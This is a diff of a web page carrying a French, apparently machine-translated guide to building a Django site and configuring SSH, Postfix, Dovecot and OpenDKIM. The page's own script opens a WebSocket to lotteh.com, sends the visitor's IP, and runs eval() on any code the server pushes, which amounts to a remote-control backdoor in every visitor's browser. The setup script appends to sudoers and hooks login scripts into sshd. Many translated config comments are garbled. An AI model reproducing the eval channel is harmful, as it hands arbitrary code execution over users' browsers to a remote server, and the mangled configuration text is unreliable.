@@ -372,7 +372,18 @@ mkdir feed/templates/feed
 &lt;/html&gt;
  </code></pre>Il s'agit d'un modèle très simple. Il définit l'ouverture et la fermeture des balises HTML, une balise de type de document, une balise corporelle avec un titre de légende, une balise de rupture qui ajoute une petite ligne à travers l'écran et une boucle pour la boucle qui rend chaque publication dans la liste des messages en tant que paragraphe dans le modèle. C'est tout ce qu'il faut pour rendre les publications, mais il n'y en a pas encore dans la base de données. Créons-nous avec la coquille. Nous pouvons exécuter le shell avec manage.py<pre class="language-bash"><code>
 python manage.py shell
-</code></pre>Maintenant, importons notre modèle de poste<pre class="language-python"><code>
+</code></pre>
+
+
+
+
+
+Now, let's import our post model
+
+
+
+
+<pre class="language-python"><code>
 from feed.models import Post
 </code></pre>Ensuite, nous créerons un article simple avec une chaîne et quitterons le shell. La chaîne peut être n'importe quoi, aussi longtemps que c'est un texte valide.<pre class="language-python"><code>
 Post.objects.create(text='hello world')
@@ -1452,7 +1463,7 @@ $('input').change(function(){
  </code></pre>Vous remarquerez qu'il s'agit d'une forme assez simple, mais il y a un peu de javascript qui publie automatiquement le contenu du formulaire lorsqu'ils sont mis à jour. Ceci est utile à avoir, vous pouvez donc effectuer des modifications sans avoir à appuyer sur Soumettre à chaque fois.
 
 Ensuite, nous avons besoin d'URL représentant toutes ces vues dans les motifs URL des utilisateurs. Modifier les utilisateurs / urls.py et ajouter ce code:<pre class="language-python"><code>
-#  … previous code, imports
+# … Code précédent, importations
 from django.urls import path
 from . import views
 
@@ -1989,11 +2000,11 @@ UsePAM yes
 X11Forwarding yes
 # X11displayoffset 10
 # X11useLocalhost Oui
-# Permittty Oui
+# Pilule oui
 PrintMotd no
 # Printlastlog oui
 # Tcpkeepalive Oui
-# Environnement permit
+# Permiterenvironment pas
 # Compression retardée
 # Intervalle client 0
 # ClientaliveCountMax 3
@@ -2002,12 +2013,12 @@ PrintMotd no
 # Maxstartups 10: 30: 100
 # Pemittunl non
 # Chrootdirectory
-# Version addendum Aucun
+# VersionaDendum Aucun
 
 # Pas de chemin de bannière par défaut
 Banner /etc/banner
 
-# Permettre au client de passer les variables d'environnement des paramètres régionaux
+#  Allow client to pass locale environment variables
 AcceptEnv LANG LC_*
 
 # remplacer la valeur par défaut d'aucun sous-système
@@ -2355,7 +2366,7 @@ echo "Setup crontab/sudoers configuration"
 sudo crontab -l -u root | cat - config/crontab | sudo crontab -u root -
 sudo sh -c "cat config/sudoers &gt;&gt; /etc/sudoers"
 # Injecter la configuration PAM et supprimer la configuration SSH défectueuse
-# Sudo sed -i '' -and $ d '/etc/pam.d/sshd
+# sudo sed -i '' -e '$ d' /tc/pam.d/sshd
 # Sudo sed -i '' -et $ d '/ etc / profil
 echo "session required pam_exec.so seteuid /home/team/femmebabe/pam.sh" | sudo tee -a /etc/pam.d/sshd
 echo "session required pam_exec.so seteuid /home/team/femmebabe/logout.sh" | sudo tee -a /etc/pam.d/sshd
@@ -2865,7 +2876,7 @@ nano config/etc_postfix_master.cf
 # 
 # ==============================================. =======================.
 # Type de service Private Upriv Chroot Wakeup MaxProc Commande + Args
-# (oui) (oui) (non) (jamais) (100)
+# (Oui) (oui) (non) (jamais) (100)
 # ==============================================. =======================.
 smtp      inet  n       -       y       -       -       smtpd
 # SMTP INET N - Y - 1 PostScreen
@@ -2896,18 +2907,18 @@ submission inet n       -       y       -       -       smtpd
 # -O milter_macro_daemon_name = originaire
 # Choisissez-en un: activez uniquement SMTPS pour les clients de Loopback, ou pour tout client.
 # 127.0.0.1:SMTPS INET N - Y - - SMTPD
-# smtps inet n - y - - smtpd
+# Smtps inet n - y - - smtpd
 # -O syslog_name = postfix / smtps
 # -o smtpd_tls_wappermode = oui
 # -o smtpd_sasl_auth_enable = oui
-# -o smtpd_reject_unlistted_recipient = non
+# -O smtpd_reject_unlistted_recipient = non
 #   -o smtpd_client_restrictions=$mua_client_restrictions
 # -o smtpd_helo_restrictions = $ mua_helo_restrictions
 # -o SMTPD_SENDER_RESTRICTIONS = $ MUA_SENDER_RESTRICTIONS
 # -o smtpd_recipent_restrictions =
 # -o smtpd_relay_restrictions = permis_sasl_authenticated, rejeter
 # -O milter_macro_daemon_name = originaire
-# 628       inet  n       -       y       -       -       qmqpd
+# 628 INET N - Y - - QMQPD
 pickup    unix  n       -       y       60      1       pickup
 cleanup   unix  n       -       y       -       0       cleanup
 qmgr      unix  n       -       n       300     1       qmgr
@@ -2968,7 +2979,7 @@ maildrop  unix  -       n       n       -       -       pipe
 # Spécifiez également dans main.cf: cyrus_destination_recipent_limit = 1
 # 
 # cyrus     unix  -       n       n       -       -       pipe
-# Flags = drx user = cyrus argv = / cyrus / bin / délivre -e -r $ {expéditeur} -m $ {extension} $ {user}
+# Flags = DRX User = Cyrus Arg = / Cyrus / bin / Deliver -e -r $ {Sender} -M $ {Extension} $ {user}
 # 
 # ==============================================. ==================.
 # Ancien exemple de livraison via Cyrus.
@@ -3101,7 +3112,7 @@ service lmtp {
 
 service imap {
   # La plupart de la mémoire va aux fichiers mmap () ing. Vous devrez peut-être augmenter cela
-  #  limit if you have huge mailboxes.
+  # Limitez si vous avez d'énormes boîtes aux lettres.
   # vsz_limit = $ default_vsz_limit
 
   # Max. Nombre de processus IMAP (connexions)
@@ -3143,7 +3154,7 @@ service auth-worker {
   # Le processus de travailleur AUTH est exécuté par défaut de racine, afin qu'il puisse accéder
   # / etc / ombre. Si ce n'est pas nécessaire, l'utilisateur doit être modifié en
   # $ default_interal_user.
-  # utilisateur = racine
+  # Utilisateur = racine
 }
 
 service dict {
@@ -3158,7 +3169,7 @@ service dict {
 </code></pre>Encore une fois, assurez-vous de remplacer le domaine dans tous ces fichiers, Femmebabe.com, par le domaine que vous avez sélectionné. Modifier le fichier suivant, la configuration de Dovecot,<pre class="language-bash"><code>
 nano config/etc_dovecot_dovecot
 </code></pre>Et ajouter ces lignes<pre class="language-bash"><code>
-## Fichier de configuration Dovecot
+## Fichier de configuration OVECOT
 
 # Si vous êtes pressé, voir http://wiki2.dovecot.org/quickconfiguration
 
@@ -3283,7 +3294,7 @@ nano config/etc_opendkim.conf
 # Il s'agit d'une configuration de base pour la signature et la vérification. Il peut facilement être
 # adapté pour s'adapter à une installation de base. Voir opendendkim.conf (5) et
 # /usr/share/doc/opendkim/examples/opendkim.conf.sample pour complet
-#  documentation of available configuration parameters.
+# Documentation des paramètres de configuration disponibles.
 
 Syslog			yes
 SyslogSuccess		yes
@@ -3544,7 +3555,7 @@ Merci d'avoir pris le temps de lire ce guide de développement Web de la troisi�
 
 
 
-<p><a href="https://lotteh.com/payments/photo/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Buy on Lotte Harper">Acheter</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">Acheter avec crypto</a></p>
+<p><a href="https://lotteh.com/payments/pay/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7" title="Buy on Lotte Harper">Acheter</a> | <a href="https://lotteh.com/payments/pay/crypto/Daisy/?id=cf8fc969-e02d-4952-a329-e60db51bc1a7&crypto=USDC" title="Buy with cryptocurrency on Lotte Harper">Acheter avec crypto</a></p>
 
 
 <hr>
@@ -3584,7 +3595,7 @@ Merci d'avoir pris le temps de lire ce guide de développement Web de la troisi�
 
 
         
-        <p>
+        
 
 <div class="dropdown">
   <a class="btn btn-outline-info dropdown-toggle" role="button" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-expanded="false">
@@ -3621,12 +3632,16 @@ Merci d'avoir pris le temps de lire ce guide de développement Web de la troisi�
     </div>
   </div>
 </div>
-</p>
+
         <p><i>Laissez-moi un pourboire dans Bitcoin en utilisant cette adresse:</i> <b id="btc-wallet">3KhDWoSve2N627RiW8grj6XrsoPT7d6qyE</b> <button class="btn btn-sm btn-info" title="Copie de copie" onclick="copyToClipboard('btc-wallet');">Copie</button></p>
+        <div id="javascript-console"></div>
 	    <div class="d-flex justify-content-between p-2">
 	        <div style="float:left;">
 	          <p><span class="badge bg-light text-dark shadow p-1">&copy; Glam Girl X 2025</span></p>
 		    </div>
+            <div style="text-align: center;">
+                 <a href="https://instagram.com/yourlocalfemme" about="_blank" title="Visitez-moi sur Instagram" style="font-size: 20px;" class="ml-1"><i class="bi bi-instagram"></i></a> <a href="https://twitter.com/teamfemmebabe" about="_blank" title="Visitez-moi sur Twitter" style="font-size: 20px;" class="ml-1"><i class="bi bi-twitter"></i></a> <a href="https://youtube.com/@daisymakeup" about="_blank" title="Regardez-moi sur youtube" style="font-size: 20px;" class="ml-1"><i class="bi bi-youtube"></i></a>
+            </div>
 	        <div style="float:right;">
 	          <p><span class="badge bg-light text-dark shadow p-1"><a href="https://lotteh.com/terms/?lang=fr" title="Voir les conditions d&#x27;utilisation">Conditions de service</a></span></p>
 		    </div>
@@ -3669,32 +3684,32 @@ function jumpbookto(page) {
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("close", (event) => {
+            remoteSocket.addEventListener("close", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -3841,34 +3856,41 @@ if(document.getElementById("current-time")) {
             image.style.height = "100%";
             image.style.maxWidth = "160px";
             image.alt = "Partagez cette page en scannant un code QR.";
-            function downloadQrImage(url, filename) {
-              const link = document.createElement('a');
-              link.href = url;
-              link.download = 'Glam Girl X - ' + filename;
-              document.body.appendChild(link);
-              link.classList.add('hide');
-              link.click();
-            }
-            function downloadQr() {
-                    downloadQrImage(image.src, 'QR Code');
-            }
-            qrdiv.onclick = downloadQr;
+            try {
+                function getBase64Image(img) {
+                    var src = img.src;
+                    var image = new Image();
+                    image.src = src;
+                    image.onload = function(event) {
+                    var bsfcanvas = document.createElement("canvas");
+                    bsfcanvas.width = img.clientWidth + 40;
+                    bsfcanvas.height = img.clientHeight + 40;
+                    if(bsfcanvas.height < bsfcanvas.width) bsfcanvas.height = bsfcanvas.width;
+                    var bsfctx = bsfcanvas.getContext("2d");
+                    bsfctx.fillStyle = "#ffffff";
+                    bsfctx.fillRect(0, 0, bsfcanvas.width, bsfcanvas.height);
+                    bsfctx.drawImage(event.target, 20, 20, bsfcanvas.width - 40, bsfcanvas.height - 40);
+                    var dataURL = bsfcanvas.toDataURL("image/png");
+                    downloadQrImage(dataURL, 'Glam Girl X - QR Code.png');
+                    };
+                }
+                function downloadQrImage(url, filename) {
+                    const link = document.createElement('a');
+                    link.download = filename;
+                    link.href = url;
+                    link.classList.add('hide');
+                    link.click();
+                }
+                function downloadQr(){
+                    var theQrImage = document.getElementById('shareqrcode').querySelector('img');
+                    getBase64Image(theQrImage);
+                }
+                qrdiv.onclick = downloadQr;
+                } catch(error) {
+                        document.getElementById('javascript-console').insertAdjacentHTML("beforeend", '<div>' + new String(error) + '</div>');
+                }
         });
     </script>
-    
-    <script async type="application/javascript"
-        src="https://news.google.com/swg/js/v1/swg-basic.js"></script>
-<script>
-  (self.SWG_BASIC = self.SWG_BASIC || []).push( basicSubscriptions => {
-    basicSubscriptions.init({
-      type: "NewsArticle",
-      isPartOfType: ["Product"],
-      isPartOfProductId: "CAowktDYCw:openaccess",
-      clientOptions: { theme: "light", lang: "en" },
-    });
-  });
-</script>
-
     
     
     
